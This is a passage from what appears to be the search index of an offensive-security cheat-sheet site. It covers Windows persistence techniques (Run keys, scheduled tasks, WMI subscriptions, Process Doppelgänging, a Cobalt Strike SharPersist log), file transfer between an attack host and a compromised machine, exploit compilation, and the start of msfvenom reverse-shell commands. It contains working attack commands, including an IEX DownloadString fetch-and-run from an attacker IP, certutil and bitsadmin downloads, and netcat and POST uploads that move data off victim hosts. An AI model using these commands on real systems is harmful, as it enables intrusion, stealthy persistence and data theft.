</ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#step-5-cleanup-and-documentation","title":"Step 5: Cleanup and Documentation","text":"<ol> <li>Remove or comment out test scripts: <code>Remove-Item -Path $PROFILE.AllUsersAllHosts</code>     Or, open the profile and manually remove or comment out the test lines if the persistence was only for temporary testing.</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/","title":"Process Doppelg\u00e4nging","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#establishing-persistence-using-process-doppelganging","title":"Establishing Persistence Using Process Doppelg\u00e4nging","text":"<p>Process Doppelg\u00e4nging is a stealthy technique that abuses Windows NTFS transactions to execute malicious code disguised as a legitimate process. Because it avoids directly writing malicious binaries to disk, it often evades detection by traditional antivirus and EDR solutions.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#step-1-creating-a-new-transaction","title":"Step 1: Creating a New Transaction","text":"<ol> <li> <p>Verify NTFS is in use     This method only works on NTFS volumes due to its transactional file system features.  </p> </li> <li> <p>Acquire necessary privileges     Typically, administrative rights are required to create and manipulate transactions.  </p> </li> <li> <p>Start an NTFS transaction     Use the Windows API to begin a transaction, which allows filesystem changes without committing them: <pre><code>HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#step-2-replacing-a-legitimate-executable","title":"Step 2: Replacing a Legitimate Executable","text":"<ol> <li> <p>Select a legitimate executable     Pick a commonly run program with sufficient execution privileges.  </p> </li> <li> <p>Create a transacted file with the same name     Open the file within the transaction context: <pre><code>HANDLE hFile = CreateFileTransacted(\n    L\"[LegitimateExecutablePath]\",\n    GENERIC_WRITE,\n    0,\n    NULL,\n    CREATE_ALWAYS,\n    FILE_ATTRIBUTE_NORMAL,\n    NULL,\n    hTransaction,\n    NULL,\n    NULL\n);\n</code></pre></p> </li> <li> <p>Write the malicious payload     Load the malicious binary into memory and write it into the transacted file: <pre><code>WriteFile(hFile, [MaliciousExecutableData], [SizeOfData], &amp;dwBytesWritten, NULL);\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#step-3-executing-the-malicious-executable","title":"Step 3: Executing the Malicious Executable","text":"<ol> <li>Run the transacted executable     While the transaction is still active, launch the process. Windows will treat it as the legitimate program: <pre><code>STARTUPINFO si = { sizeof(si) };\nPROCESS_INFORMATION pi;\nCreateProcess(\n    NULL,\n    L\"[LegitimateExecutablePath]\",\n    NULL,\n    NULL,\n    FALSE,\n    0,\n    NULL,\n    NULL,\n    &amp;si,\n    &amp;pi\n);\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#step-4-rolling-back-the-transaction","title":"Step 4: Rolling Back the Transaction","text":"<ol> <li>Rollback changes     After execution, rollback the transaction to remove the malicious binary from disk while the process remains running: <pre><code>RollbackTransaction(hTransaction);\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Process-Doppelg%C3%A4nging/#step-5-cleanup","title":"Step 5: Cleanup","text":"<ol> <li>Close handles and free resources     Always release allocated resources to maintain stability: <pre><code>CloseHandle(hFile);\nCloseHandle(hTransaction);\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/","title":"Registry Keys","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#establishing-persistence-using-registry-keys","title":"Establishing Persistence Using Registry Keys","text":"<p>Using the Windows Registry for persistence involves creating or modifying registry keys that instruct Windows to automatically execute specific programs or scripts at certain events, like system startup or user logon.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#step-1-selecting-the-appropriate-registry-key","title":"Step 1: Selecting the Appropriate Registry Key","text":"<p>Depending on the persistence requirement (system-wide or user-specific), choose the appropriate registry location:</p> <ol> <li> <p>For all users (requires administrative privileges) : <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></p> </li> <li> <p>For the current user only: <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></p> </li> <li> <p>Ensure the executable or script is reliable and placed in a secure, accessible location. It should not require additional prompts or permissions that might hinder its execution.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#step-2-adding-a-registry-entry","title":"Step 2: Adding a Registry Entry","text":"<ol> <li> <p>Open the Registry Editor: Press <code>Win + R</code>, type <code>regedit</code>, and press Enter. Ensure you have the necessary permissions to modify the registry.</p> </li> <li> <p>Navigate to the appropriate key</p> </li> <li> <p>For system-wide execution, navigate to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.</p> </li> <li> <p>For current user execution, navigate to <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.</p> </li> <li> <p>Create a new string value</p> </li> <li> <p>Right-click in the right pane, select <code>New</code> &gt; <code>String Value</code>.</p> </li> <li> <p>Name the new string value descriptively to disguise its purpose (e.g., <code>SystemHelper</code>).</p> </li> <li> <p>Set the value of the new entry:</p> </li> <li> <p>Double-click the new string value and enter the path to your executable or script as the value data. For example: <code>C:\\Path\\To\\Your\\Executable.exe</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#step-3-testing-persistence","title":"Step 3: Testing Persistence","text":"<ol> <li>Restart Your Computer or log out and then log back in (if using HKEY_CURRENT_USER) to test if the setup works.</li> <li>Verify Execution: After logging back in or restarting, check if your program or script runs automatically.</li> <li>Remove or Disable the Registry Entry When No Longer Needed: <code>reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SystemHelper /f</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#technique-1-using-alternate-registry-paths","title":"Technique 1: Using Alternate Registry Paths","text":"<p>Some applications use specific registry paths to configure auto-start settings. You can place your persistence mechanism in less commonly monitored registry paths.</p> <ol> <li>Identify Custom Registry Keys: Applications may use custom registry keys for auto-start. Identify these through documentation or by monitoring application installations.</li> <li>Example: Instead of the standard Run keys, you might use: <code>HKEY_CURRENT_USER\\Software\\Classes\\clsid\\{GUID}\\shell\\open\\command</code></li> <li>Place your executable path here to trigger it when the application linked to the GUID is invoked.</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#technique-2-registry-key-hijacking","title":"Technique 2: Registry Key Hijacking","text":"<p>Modify existing legitimate registry keys to include your persistence payload, which can be particularly stealthy.</p> <ol> <li> <p>Find Vulnerable Keys: Use a registry scanner to find legitimate keys that auto-start programs, services, or drivers that frequently update or change. <code>Find legitimate keys that auto-start programs, services, or drivers that frequently update or change.</code></p> </li> <li> <p>Append or Modify the Executable Path: <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"LegitimateService\" /d \"C:\\Path\\To\\Your\\Executable.exe &amp;&amp; original_command.exe\" /f</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#technique-3-powershell-registry-manipulation","title":"Technique 3: PowerShell Registry Manipulation","text":"<p>Manipulate registry keys using PowerShell to leave fewer traces and utilize more complex logic.</p> <ol> <li> <p>Develop a Script: Use PowerShell's ability to script complex conditions, check for user activity, or system states before modifying the registry.</p> <pre><code>If ((Get-Process -Name explorer -ErrorAction SilentlyContinue) -ne $null) {\n  Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Updater\" -Value \"C:\\Path\\To\\Script.ps1\"\n}\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Registry-Keys/#cobalt-strike-example","title":"Cobalt Strike Example","text":"<p>AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3<sup>rd</sup> party applications such as software updaters, download assistants, driver utilities and so on.</p> <pre><code>beacon&gt; cd C:\\ProgramData\nbeacon&gt; upload C:\\Payloads\\http_x64.exe\nbeacon&gt; mv http_x64.exe updater.exe\nbeacon&gt; execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe -t reg -c \"C:\\ProgramData\\Updater.exe\" -a \"/q /n\" -k \"hkcurun\" -v \"Updater\" -m add\n\n[*] INFO: Adding registry persistence\n[*] INFO: Command: C:\\ProgramData\\Updater.exe\n[*] INFO: Command Args: /q /n\n[*] INFO: Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n[*] INFO: Registry Value: Updater\n[*] INFO: Option: \n[+] SUCCESS: Registry persistence added\nWhere:\n</code></pre> <p>-k is the registry key to modify. -v is the name of the registry key to create.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Scheduled-Tasks/","title":"Scheduled Tasks","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Scheduled-Tasks/#introduction","title":"INTRODUCTION","text":"<p>Creating and managing scheduled tasks in Windows can be done via the graphical user interface of Task Scheduler or through the command line using <code>schtasks</code>, a powerful command-line tool provided by Windows.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Scheduled-Tasks/#step-by-step-guide-to-establish-persistence-using-scheduled-tasks","title":"Step-by-Step Guide to Establish Persistence Using Scheduled Tasks","text":"<ol> <li> <p>Make sure the script or executable that you want to run is tested and properly located in a secure directory where it has appropriate permissions.</p> </li> <li> <p>Create a Task that Triggers at System Startup <code>schtasks /create /tn \"MyStartupTask\" /tr \"C:\\Path\\To\\Your\\Executable.exe\" /sc onstart /ru SYSTEM</code></p> </li> <li> <p>Create a Task that Triggers at User Logon: Replace UserName with the actual username if you want it to run only under a specific user account, or use users to run for all users. <code>schtasks /create /tn \"MyLogonTask\" /tr \"C:\\Path\\To\\Your\\Executable.exe\" /sc onlogon /ru \"UserName\"</code></p> </li> <li> <p>Create a Task that Triggers Daily at a Specific Time: <code>schtasks /create /tn \"MyDailyTask\" /tr \"C:\\Path\\To\\Your\\Executable.exe\" /sc daily /st 10:00 /ru SYSTEM</code></p> </li> <li> <p>Change the Properties of an Existing Task: <code>schtasks /change /tn \"MyStartupTask\" /sc daily /st 09:00</code></p> </li> <li> <p>Remove a Task When No Longer Needed: <code>schtasks /delete /tn \"MyStartupTask\" /f</code></p> </li> <li> <p>View All Scheduled Tasks: <code>schtasks /query</code></p> </li> <li> <p>After setting up your task, you can run it manually to test if it works correctly: <code>schtasks /run /tn \"MyStartupTask\"</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/","title":"Startup Folder","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/#establishing-persistence-using-the-startup-folder","title":"Establishing Persistence Using the Startup Folder","text":"<p>Using the Startup folder for persistence is one of the simplest techniques. Any executable or script placed in this folder will automatically run each time the user logs in.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/#step-1-identifying-the-startup-folder","title":"Step 1: Identifying the Startup Folder","text":"<p>The Startup folder exists in two common locations:</p> <ol> <li> <p>User-specific Startup folder (runs only for the logged-in user): <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\</code></p> </li> <li> <p>All users Startup folder (runs for all accounts): <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/#step-2-creating-the-executable","title":"Step 2: Creating the Executable","text":"<ol> <li> <p>Create an executable or script you want to run at each system startup. Examples: a <code>.bat</code> file, <code>.ps1</code> PowerShell script, or compiled <code>.exe</code>.</p> </li> <li> <p>Ensure the payload runs without requiring additional permissions that might block execution at startup.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/#step-3-placing-the-executable-in-the-startup-folder","title":"Step 3: Placing the Executable in the Startup Folder","text":"<ul> <li>Copy the payload to the user-specific Startup folder: <code>copy path\\to\\your\\executable.exe \"C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"</code></li> <li>Or copy it to the all users Startup folder:     <code>copy path\\to\\your\\executable.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\"</code></li> </ul>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Startup-Folder/#step-4-testing-persistence","title":"Step 4: Testing Persistence","text":"<ol> <li> <p>Restart the computer or log out and log back in to trigger startup items.</p> </li> <li> <p>Verify that your executable or script launches as expected.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/WMI-Event-Subscription/","title":"WMI Event Subscription","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/WMI-Event-Subscription/#introduction","title":"Introduction","text":"<p>Windows Management Instrumentation (WMI) is a powerful feature in Windows for system management and monitoring. WMI Event Subscription can be used for persistence by executing scripts or programs automatically when certain system events occur.  </p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/WMI-Event-Subscription/#step-by-step-establishing-persistence-using-wmi-event-subscription","title":"Step-by-Step: Establishing Persistence Using WMI Event Subscription","text":"<ol> <li> <p>Identify the Trigger Event    Decide what event should trigger the payload.    Example: <code>__InstanceCreationEvent</code> (occurs when a new instance of a WMI class is created).</p> </li> <li> <p>Create an Event Filter    Define the conditions under which the event will trigger using WQL (WMI Query Language):  </p> <pre><code>New-CimInstance -Namespace root\\subscription -ClassName __EventFilter -Property @{\n    Name = 'MyEventFilter';\n    EventNamespace = 'root\\cimv2';\n    QueryLanguage = 'WQL';\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 60 \n            WHERE TargetInstance ISA 'Win32_Process' \n            AND TargetInstance.Name = 'notepad.exe'\"\n}\n</code></pre> </li> <li> <p>Create an Event Consumer     Specify the action to take when the filter condition is met (e.g., execute a script):</p> <pre><code>New-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer -Property @{\n    Name = 'MyEventConsumer';\n    CommandLineTemplate = \"C:\\\\Path\\\\To\\\\Your\\\\Script.bat\"\n}\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/","title":"Download Operations","text":""},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#connecting-to-an-smb-share-using-powershell","title":"Connecting to an SMB share using PowerShell","text":"<ol> <li>Set up an SMB server with credentials <code>sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast</code></li> <li>Convert password to a secure string <code>$pass = convertto-securestring 'hackfast' -AsPlainText -Force</code></li> <li>Create a credential object <code>$cred = New-Object System.Management.Automation.PSCredential('hackfast',$pass)</code></li> <li>Map the network drive <code>New-PSDrive -Name hackfast -PSProvider FileSystem -Credential $cred -Root \\\\[IP-ADDRESS]\\hackfast</code></li> <li>Navigate to the mapped drive <code>cd hackfast:</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#downloading-files-via-smb-no-credentials","title":"Downloading files via SMB (no credentials)","text":"<ol> <li>Set up an SMB server <code>sudo impacket-smbserver share -smb2support .</code></li> <li>Download a file from the SMB server <code>copy \\\\[IP-ADDRESS]\\share\\file.txt .</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#downloading-files-via-smb-with-credentials","title":"Downloading files via SMB (with credentials)","text":"<ol> <li>Configure the SMB server using impacket-smbserver <code>sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast</code></li> <li>Configure the SMB server using smbserver.py <code>smbserver.py hackfast . -smb2support -username hackfast -password hackfast</code></li> <li>Map a network drive <code>net use z: \\\\[IP-ADDRESS]\\hackfast /user:hackfast hackfast</code></li> <li>Copy a file from the mapped drive <code>copy z:\\file.txt .</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#downloading-files-via-ftp","title":"Downloading files via FTP","text":"<ol> <li>Start an FTP server <code>sudo python3 -m pyftpdlib --port 21</code></li> <li>Download a file using PowerShell <code>(New-Object Net.WebClient).DownloadFile('ftp://[IP-ADDRESS]/file.txt', 'C:\\Users\\Public\\file.txt')</code></li> <li> <p>Automate FTP downloads with a command file  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-files-python-2","title":"Setting up an HTTP server and downloading files (Python 2)","text":"<ol> <li>Start an HTTP server <code>python -m SimpleHTTPServer 8000</code></li> <li>Download a file using PowerShell <code>powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt</code></li> <li>Download a file using certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt</code></li> <li>Download a file using bitsadmin <code>bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\\Users\\Public\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-downloading-files-python-3","title":"Setting up an HTTP server and downloading files (Python 3)","text":"<ol> <li>Start an HTTP server <code>python3 -m http.server 8000</code></li> <li>Download a file using PowerShell <code>powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt</code></li> <li>Download a file using certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt</code></li> <li>Download a file using bitsadmin <code>bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\\Users\\Public\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-file-download-php","title":"Setting up an HTTP server and file download (PHP)","text":"<ol> <li>Start an HTTP server <code>php -S 0.0.0.0:8000</code></li> <li>Download a file using PowerShell <code>powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt</code></li> <li>Download a file using certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt</code></li> <li>Download a file using bitsadmin <code>bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\\Users\\Public\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#setting-up-an-http-server-and-file-download-ruby","title":"Setting up an HTTP server and file download (Ruby)","text":"<ol> <li>Start an HTTP server <code>ruby -run -e httpd . -p 8000</code></li> <li>Download a file using PowerShell <code>powershell iwr -uri http://[IP-ADDRESS]:8000/file.txt -outfile file.txt</code></li> <li>Download a file using certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/file.txt file.txt</code></li> <li>Download a file using bitsadmin <code>bitsadmin /transfer debjob /download /priority normal http://[IP-ADDRESS]:8000/file.txt C:\\Users\\Public\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#setting-up-an-apache-server-and-file-download","title":"Setting up an Apache server and file download","text":"<ol> <li>Place the file in the Apache web directory <code>cp nc.exe /var/www/html</code></li> <li>Start the Apache server <code>sudo systemctl start apache2</code></li> <li>Download a file via browser or PowerShell <code>Invoke-WebRequest -Uri http://[IP-ADDRESS]/file.txt -OutFile file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#encoding-and-decoding-files-with-base64","title":"Encoding and decoding files with Base64","text":"<ol> <li>Generate an MD5 checksum <code>md5sum file.txt</code></li> <li>Encode file content to Base64 <code>cat file.txt | base64 -w 0; echo</code></li> <li>Decode Base64 content on Windows <code>[IO.File]::WriteAllBytes(\"C:\\Temp\\file.txt\", [Convert]::FromBase64String(\"[BASE64-STRING]\"))</code></li> <li>Verify the MD5 checksum of the decoded file <code>Get-FileHash C:\\Temp\\file.txt -Algorithm MD5</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#downloading-files-from-a-remote-session","title":"Downloading files from a remote session","text":"<ol> <li>Create a PowerShell remoting session <code>$Session = New-PSSession -ComputerName DATABASE01</code></li> <li>Copy a file from the remote session to the local machine <code>Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\file.txt\" -Destination C:\\ -FromSession $Session</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#file-transfers-with-netcat-and-ncat","title":"File transfers with netcat and ncat","text":"<ol> <li>Receiving a file (compromised machine)  <ul> <li>Using netcat (listening): <code>nc -l -p 8000 &gt; received_file.exe</code></li> </ul> </li> <li>Sending a file (attack host)  <ul> <li>Using netcat <code>nc -q 0 [IP-ADDRESS] 8000 &lt; file.exe</code> </li> <li>Using ncat <code>ncat --send-only [IP-ADDRESS] 8000 &lt; file.exe</code></li> </ul> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#downloading-files-via-rdp-linux-to-windows","title":"Downloading files via RDP (Linux to Windows)","text":"<ol> <li>Using rdesktop for file transfer <code>rdesktop [IP-ADDRESS] -d [DOMAIN] -u [USERNAME] -p '[PASSWORD]' -r disk:linux='/home/user/rdesktop/files'</code></li> <li>Using xfreerdp for file transfer <code>xfreerdp /v:[IP-ADDRESS] /d:[DOMAIN] /u:[USERNAME] /p:'[PASSWORD]' /drive:[NAME],[PATH]</code></li> <li>Access mounted directory in the RDP session     Connect to <code>\\\\tsclient\\</code> within the RDP session to transfer files.</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Download-Operations/#powershell-web-downloads","title":"PowerShell web downloads","text":"<ol> <li>Download a file using DownloadFile <code>(New-Object Net.WebClient).DownloadFile('http://[IP-ADDRESS]:8000/file.ps1','C:\\Temp\\file.ps1')</code></li> <li>Download a file asynchronously (non-blocking) <code>(New-Object Net.WebClient).DownloadFileAsync('http://[IP-ADDRESS]:8000/file.ps1', 'C:\\Temp\\file.ps1')</code></li> <li>Execute fileless download using DownloadString <code>IEX (New-Object Net.WebClient).DownloadString('http://[IP-ADDRESS]:8000/file.ps1')</code></li> <li>Download a file using Invoke-WebRequest <code>Invoke-WebRequest http://[IP-ADDRESS]:8000/file.ps1 -OutFile C:\\Temp\\file.ps1</code></li> <li>Bypass Internet Explorer configuration <code>Invoke-WebRequest http://[IP-ADDRESS]:8000/file.ps1 -UseBasicParsing</code></li> <li>Bypass SSL/TLS certificate issues <code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/","title":"Upload Operations","text":""},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-files-via-smb-no-credentials","title":"Uploading files via SMB (no credentials)","text":"<ol> <li>Set up an SMB server <code>sudo impacket-smbserver hackfast -smb2support .</code></li> <li>Map a network drive <code>net use z: \\\\[IP-ADDRESS]\\hackfast</code></li> <li>Upload a file via SMB <code>copy file.txt z:\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-files-via-smb-with-credentials","title":"Uploading files via SMB (with credentials)","text":"<ol> <li>Configure the SMB server using impacket-smbserver <code>sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast</code></li> <li>Configure the SMB server using smbserver.py <code>smbserver.py share . -smb2support -username hackfast -password hackfast</code></li> <li>Map a network drive <code>net use z: \\\\[IP-ADDRESS]\\hackfast /user:hackfast hackfast</code></li> <li>Upload a file to the mapped drive <code>copy file.txt z:\\file.txt</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-files-via-ftp","title":"Uploading files via FTP","text":"<ol> <li>Set up a write-enabled FTP server <code>sudo python3 -m pyftpdlib --port 21 --write</code></li> <li>Upload a file using PowerShell <code>(New-Object Net.WebClient).UploadFile('ftp://[IP-ADDRESS]/file.txt', 'C:\\Windows\\Temp\\file.txt')</code></li> <li> <p>Automate FTP upload with a command file  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#powershell-base64-web-upload-with-netcat","title":"PowerShell Base64 web upload with netcat","text":"<ol> <li>Encode the file to Base64 (on Windows) <pre><code>$filePath = 'C:\\Windows\\Temp\\file_name'\n$b64 = [System.Convert]::ToBase64String((Get-Content -Path $filePath -Encoding Byte))\n</code></pre></li> <li>Start a netcat listener to capture the POST request <code>nc -lvnp 8080 &gt; received_b64.txt</code></li> <li>Upload the Base64 string via HTTP POST <code>Invoke-WebRequest -Uri http://[IP-ADDRESS]:8080/ -Method POST -Body $b64</code></li> <li>Decode the Base64 string received via netcat <code>cat received_b64.txt | base64 -d &gt; file_name</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-a-file-to-a-remote-session","title":"Uploading a file to a remote session","text":"<ol> <li>Create a PowerShell remoting session <code>$Session = New-PSSession -ComputerName DATABASE01</code></li> <li>Copy a file from the local machine to the remote session <code>Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-files-via-webdav","title":"Uploading files via WebDAV","text":"<ol> <li>Install a WebDAV server <code>sudo pip3 install wsgidav cheroot</code></li> <li>Start the WebDAV server <code>sudo wsgidav --host=0.0.0.0 --port=8081 --root=/tmp --auth=anonymous</code></li> <li>List directory contents <code>dir \\\\[IP-ADDRESS]\\DavWWWRoot</code></li> <li>Copy a file to the WebDAV server <code>copy C:\\Temp\\file.zip \\\\[IP-ADDRESS]\\DavWWWRoot\\</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#netcat-file-upload-sending","title":"Netcat file upload (sending)","text":"<p>On the attack host (listening):</p> <ol> <li>Using netcat <code>sudo nc -l -p 443 -q 0 &lt; file_to_send.exe</code></li> <li>Using ncat <code>sudo ncat -l -p 443 --send-only &lt; file_to_send.exe</code></li> </ol> <p>On the compromised machine (connecting):</p> <ol> <li>Using netcat <code>nc [IP-ADDRESS] 443 &gt; received_file.exe</code></li> <li>Using ncat <code>ncat [IP-ADDRESS] 443 --recv-only &gt; received_file.exe</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-a-file-via-rdp-linux-to-windows","title":"Uploading a file via RDP (Linux to Windows)","text":"<ol> <li>Using rdesktop <code>rdesktop [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] -r disk:linux='/home/user/rdesktop/files'</code></li> <li>Using xfreerdp <code>xfreerdp /v:[IP-ADDRESS] /u:[USERNAME] /p:'[PASSWORD]' /drive:[NAME],[PATH]</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/File-Transfer/Upload-Operations/#uploading-files-using-powershell","title":"Uploading files using PowerShell","text":"<ol> <li>Download and load a PowerShell upload script <code>IEX (New-Object Net.WebClient).DownloadString('http://[IP-ADDRESS]:8000/PSUpload.ps1')</code></li> <li>Upload a file using the script <code>Invoke-FileUpload -Uri http://[IP-ADDRESS]:8080/upload -File C:\\Windows\\Temp\\file_name</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/General/Compiling-Exploits/","title":"Compiling Exploits","text":""},{"location":"Offensive-Security/Windows-Environment/General/Compiling-Exploits/#compiling-the-exploit","title":"Compiling the Exploit","text":"<p>Sometimes you encounter target running older or vulnerable version of kernel and quick google will give you require exploit code to run and gain root privileges , but in most case , this exploit will come as piece of c code and not  as binary so you can't run it without compiling it first</p> <p>If the remote host has compilation tools installed like GCC, it is best to compile the exploit on the target host. This can save you trouble with missing packages, dependencies and system specific variables (such as the architecture). If the target host does not have the right tools available to compile exploits, then you will have to compile the exploit locally on your attack box and then transfer the compiled exploit to the target.</p> <ol> <li> <p>For 32 bit environment     <code>i686-w64-mingw32-gcc -o main32.exe main.c</code></p> </li> <li> <p>For 64 bit environment     <code>x86_64-w64-mingw32-gcc -o main64.exe main.c</code></p> </li> </ol> <p><code>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</code></p> <pre><code>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe\n</code></pre>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/","title":"MSFvenom","text":""},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#common-mistakes-to-avoid","title":"Common mistakes to avoid","text":"<ol> <li>Mismatched payloads  </li> <li>Trying to catch a staged shell without using the multi/handler  </li> <li>Architecture mismatch  </li> <li>Remember: 32-bit payloads don\u2019t include the architecture in the name, but 64-bit payloads do (see below).  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#meterpreter-binaries","title":"Meterpreter binaries","text":""},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#staged-payloads-for-windows","title":"Staged payloads for Windows","text":"Architecture Command x86 <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; 